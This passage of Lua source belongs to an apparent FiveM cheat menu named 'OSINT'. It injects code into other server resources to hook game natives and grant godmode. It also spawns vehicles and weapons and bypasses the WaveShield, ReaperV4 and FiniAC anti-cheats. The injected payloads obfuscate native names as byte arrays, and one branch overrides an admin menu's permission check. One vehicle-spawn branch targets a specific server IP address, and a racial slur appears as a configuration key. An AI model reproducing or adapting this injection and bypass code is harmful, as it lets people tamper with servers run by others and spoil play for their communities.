                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        else
            OSINT:Notify("error", "OSINT", "Godmode Disabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        end
        return
    end

    -- Non-WaveShield branch
    if enabled then
        OSINT:Notify("success", "OSINT", "Godmode Enabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]])
    else
        OSINT:Notify("error", "OSINT", "Godmode Disabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]])
    end
end



function OSINT:SpawnSelectedVehicle(model, teleportInto, deletePrevious)
    if not model or model == "" then return end

    local ped = PlayerPedId()
    local currentVeh = GetVehiclePedIsIn(ped, false)
    local serverEndpoint = GetCurrentServerEndpoint()

    -- capture original coords/heading once so injected code can use literal numbers (avoid nil ogCoords inside injection)
    local ogCoords = GetEntityCoords(ped)
    local ogHeading = GetEntityHeading(ped)

    if GetResourceState("solos-rentals") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 1)", 3000)
        print("Creating Vehicle via Fallback #1")
        Injection("solos-rentals", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
    elseif GetResourceState("amigo") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 2)", 3000)
        print("Creating Vehicle via Fallback #2")
        Injection("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif targetResource then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 3)", 3000)
        print("Creating Vehicle via Fallback #3")
        Injection(targetResource, string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("qb-core") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 4)", 3000)
        print("Creating Vehicle via Fallback #4")
        Injection("qb-core", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]] .. model .. [["

            if ]] .. tostring(deletePrevious) .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]] .. tostring(teleportInto) .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]] .. ogCoords.x .. [[, ]] .. ogCoords.y .. [[, ]] .. ogCoords.z .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]] .. ogHeading .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]])
    elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 5)", 3000)
        print("Creating Vehicle via Fallback #5")
        Injection("drc_gardener", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lunar_bridge") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 6)", 3000)
        print("Creating Vehicle via Fallback #6")
        Injection("lunar_bridge", string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lation_laundering") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 7)", 3000)
        print("Creating Vehicle via Fallback #7")
        Injection("lation_laundering", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]], model, tostring(teleportInto), tostring(deletePrevious)))
    else
        local fallback = enviGetStartedFallbackResource()
        if fallback then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 8)", 3000)
            print("Creating Vehicle via Fallback #8")
            Injection(fallback, string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]], model, tostring(deletePrevious), tostring(teleportInto)))
elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") == "started" then
    self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 9)", 3000)

    if not model or model == "" then return end

    local function b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return "{" .. table.concat(t, ",") .. "}"
    end

    local modelLit = b(model)
    local deletePrev = tostring(deletePrevious)
    local warpIn = tostring(teleportInto)

    local payload = string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]], modelLit, deletePrev, warpIn)

    local ok, err = pcall(MachoInjectResourceRaw, "monitor", payload)
    if not ok then
    end
    return
end

        if GetResourceState("lb-phone") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 10)", 3000)
            print("Creating Vehicle via Fallback #10")
            local success, err = pcall(function()
                Injection("lb-phone", ([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(deletePrevious), model, tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
            end)
            if not success then
            end
        elseif GetResourceState("qb-core") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 11)", 3000)
            print("Creating Vehicle via Fallback #11")
            Injection("lb-phone", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]], tostring(deletePrevious), GetHashKey(model), tostring(teleportInto)))
        else
            return
        end
    end
end

local function IsOnlyReaperV4Active()
    local otherACs = {"WaveShield", "FiniAC"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("ReaperV4") == "started"
end

local function IsOnlyFiniActive()
    local otherACs = {"ReaperV4", "WaveShield"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("FiniAC") == "started"
end

function OSINT:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    local weaponBytes = encodeToByteArrayLiteral(weaponModel)
    local playerPed = PlayerPedId()
    if not playerPed or playerPed <= 0 then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    local WaveShit = GetResourceState("WaveShield") == 'started'

    if WaveShit then
        self:Notify("success", "OSINT", "Spawned Weapon via WaveShield Bypass V2", 3000)
    Injection(GetResourceState("ox_lib") == "started" and "ox_lib" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]], playerPed, weaponBytes))
    elseif GetResourceState("ReaperV4") == "started" then
        MachoResourceStop("ox_inventory")
        MachoResourceStop("ox_lib")
        self:Notify("success", "OSINT", "Spawned Weapon via ReaperV4 fallback", 3000)
        GiveWeaponToPed(playerPed, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(playerPed, weaponHash, true)
        Wait(250)
        MachoInjectResource("ReaperV4", [[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]] .. weaponHash .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]])
    elseif GetResourceState("FiniAC") == "started" then
        self:Notify("info", "OSINT", "Spawned Weapon Bypass #1", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]], weaponBytes)
        )
    else
        self:Notify("info", "OSINT", "Spawned Weapon Bypass #2", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]], weaponBytes)
        )
    end
end

function OSINT:GiveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
